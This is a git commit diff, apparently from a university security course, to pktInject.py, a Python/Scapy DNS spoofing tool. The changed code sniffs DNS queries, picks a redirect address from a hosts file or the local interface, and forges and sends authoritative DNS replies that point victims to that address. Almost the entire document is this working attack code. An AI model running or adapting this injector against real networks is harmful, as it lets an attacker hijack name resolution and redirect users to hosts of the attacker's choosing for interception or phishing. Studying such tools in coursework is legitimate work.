5ad745403c0573beebd38b99f62587163152efc5
SelinaDeepKaur <sekaur@cs.stonybrook.edu>
2017-12-07 16:54:31 -0800

    Baseline complete part 1

--- pktInject.py
+++ pktInject.py
@@ -28,29 +28,42 @@ def get_ip(ifname):
 #        print pkt[TCP]
 
 def injector(pkt):
-	pkt.show()print '--------------------------------has IP----------------------------------------'
+	#pkt.show()
+	redirect_to=""
+	#print '--------------------------------has IP----------------------------------------'
 	if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].aa == 0:
+		pkt.show()
 		#print '--------------------------------has IP----------------------------------------'
 	#if((pkt[IP].src in expression) or (expression == "")): 
 		#if pkt.haslayer(DNSQR): # DNS question record
-		print 'has DNSQR'
+		#print 'has DNSQR'
 		affectedHost = pkt[DNSQR].qname
 		if options.hostsmap!=None:
 			file=open(options.hostsmap,"r")
 			for line in file:
-				if affectedHost in line:	
+				if affectedHost.rstrip('.') in line:	
                     			row = line.split(" ")
                     			redirect_to = row[0]
+					
+			if(redirect_to==""):
+				return
+					
 		else:
 			redirect_to = get_ip(options.interface)
-		print 'starting spoofing'
-		spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-			      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-			      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
-			      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
-		print 'spoofed'
+		#print 'starting spoofing'
+		if pkt.haslayer(UDP):
+			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+				      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+				      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
+				      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
+		else:
+			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+				      UDP(dport=pkt[TCP].sport, sport=pkt[TCP].dport)/\
+				      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
+				      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
+		#print 'spoofed'
 		send(spoofed_pkt)
-		print 'Sent:', spoofed_pkt.summary()
+		#print 'Sent:', spoofed_pkt.summary()
 
 if __name__ == '__main__':
 	#expression = ""
@@ -61,9 +74,10 @@ if __name__ == '__main__':
 
 	(options, remainder) = parser.parse_args()
 	expression = remainder
-	print options.interface
-	print options.hostsmap
-	print expression
+	#print options.interface
+	#print options.hostsmap
+	#print expression
+	
 	if len(expression)>0:
 		exp = expression[0]
 	else:
